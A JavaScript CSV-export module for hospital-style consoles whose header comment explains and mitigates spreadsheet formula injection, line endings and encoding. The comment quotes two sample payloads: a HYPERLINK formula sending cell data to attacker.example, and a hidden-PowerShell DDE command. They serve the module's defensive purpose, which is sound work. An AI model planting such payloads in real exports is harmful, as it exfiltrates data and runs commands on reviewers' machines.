/**
 * CSV serialisation for the console exports.
 *
 * Why this module exists
 * ----------------------
 * Twenty-one hub consoles each shipped their own CSV exporter, and every one of them is the same
 * line:
 *
 *   const csv = rows.map((r) => r.map((c) => `"${String(c).replace(/"/g, '""')}"`).join(",")).join("\n");
 *
 * That handles quotes and, because every field is quoted unconditionally, commas and newlines too.
 * It gets three other things wrong.
 *
 * 1. Formula injection.
 *
 *    A CSV field is data. A spreadsheet treats a field beginning with `=`, `+`, `-`, `@`, a tab or a
 *    carriage return as a *formula*, and quoting does not change that - the quotes are consumed by
 *    the CSV parser before the cell contents are evaluated. So an equipment note reading
 *
 *      =HYPERLINK("https://attacker.example/?d="&A1&A2&A3,"Click for report")
 *
 *    is a live, clickable exfiltration link in the reviewer's spreadsheet, and
 *
 *      =cmd|'/c powershell -w hidden ...'!A1
 *
 *    is a DDE payload that older Excel installations will offer to execute. Every field in these
 *    exports is attacker-influenced: equipment names, patient identifiers, batch numbers, technician
 *    notes and alert bodies all originate from user input or from a supplier feed. The equipment
 *    export was hardened against this; the twenty-one console exporters were written afterwards and
 *    never picked it up.
 *
 *    The mitigation is to prefix a triggering field with a single quote, which Excel, LibreOffice
 *    and Google Sheets all read as "the rest of this cell is literal text".
 *
 *    The `-` trigger needs care, because `-80` is a freezer setpoint and `-14.2` is a room pressure,
 *    and prefixing those would turn a number into text and break every downstream sum. So a field
 *    that is a well-formed number is left alone: it cannot start a formula, and mangling it costs
 *    real analytical value. Anything else that starts with a trigger is escaped.
 *
 * 2. Line endings. RFC 4180 specifies CRLF. LF-only files are read as a single row by some Windows
 *    tooling.
 *
 * 3. Encoding. Without a UTF-8 BOM, Excel on Windows decodes the file as the system code page, so
 *    every non-ASCII character in a name, a unit or a µ prefix is corrupted.
 *
 * The equipment import/export path already got 2 and 3 right, in its own copy. This module is the
 * single implementation for all of it.
 */

/** Fields a spreadsheet may evaluate rather than display. Tab and CR are included because Excel */
/*  strips leading whitespace before deciding, so "\t=1+1" is still a formula. */
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

/**
 * A well-formed decimal number, with an optional sign and an optional exponent.
 *
 * Matched fields skip the formula guard. `-80`, `+1.5`, `-14.2` and `1e-3` are all numbers a
 * spreadsheet should treat as numbers; none of them can begin a formula, and quoting them as text
 * would break the sums the export exists to support.
 */
const NUMERIC_FIELD = /^[-+]?(\d+\.?\d*|\.\d+)([eE][-+]?\d+)?$/;

/**
 * Escapes one field for CSV: neutralises spreadsheet formulas, then quotes per RFC 4180.
 *
 * Every field is quoted, not only the ones that need it. That is what the exporters this replaces
 * did, it is valid RFC 4180, and it keeps the output stable when a value later grows a comma.
 *
 * @param {*} value        the cell value; null and undefined become an empty field
 * @param {object} options `formulaSafe: false` skips the formula guard - only for a CSV being sent
 *                         to a parser rather than to a spreadsheet (see rowsToCsv)
 * @returns {string} the quoted field, without a trailing separator
 */
export function escapeCsvField(value, options = {}) {
  const { formulaSafe = true } = options;
  const text = value === null || value === undefined ? "" : String(value);

  const neutralised =
    formulaSafe && FORMULA_TRIGGERS.test(text) && !NUMERIC_FIELD.test(text) ? `'${text}` : text;

  return `"${neutralised.replace(/"/g, '""')}"`;
}

/**
 * Serialises a table into an RFC 4180 document.
 *
 * @param {Array<Array<*>>} rows  the table, header row included
 * @param {object} options        `formulaSafe: false` for machine-bound output; `bom: false` to omit
 *                                the UTF-8 byte order mark
 * @returns {string} the CSV document
 */
export function rowsToCsv(rows, options = {}) {
  const { formulaSafe = true, bom = true } = options;
  const body = rows
    .map((row) => row.map((cell) => escapeCsvField(cell, { formulaSafe })).join(","))
    .join("\r\n");

  return bom ? `﻿${body}` : body;
}

/**
 * Serialises a table and hands it to the browser as a download.
 *
 * The object URL is revoked after the click. Leaking it pins the whole blob in memory for the life
 * of the document, which on a console that exports a few thousand telemetry rows on every tab switch
 * is not academic.
 *
 * @param {string} filename            the suggested download name
 * @param {Array<Array<*>>} rows       the table, header row included
 * @param {object} options             forwarded to rowsToCsv
 * @returns {number} the number of data rows written, excluding the header
 */
export function downloadCsv(filename, rows, options = {}) {
  const csv = rowsToCsv(rows, options);
  const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);

  const anchor = document.createElement("a");
  anchor.href = url;
  anchor.download = filename;
  // Appended before the click: Firefox ignores a click on an anchor that is not in the document.
  document.body.appendChild(anchor);
  anchor.click();
  anchor.remove();
  URL.revokeObjectURL(url);

  return Math.max(0, rows.length - 1);
}
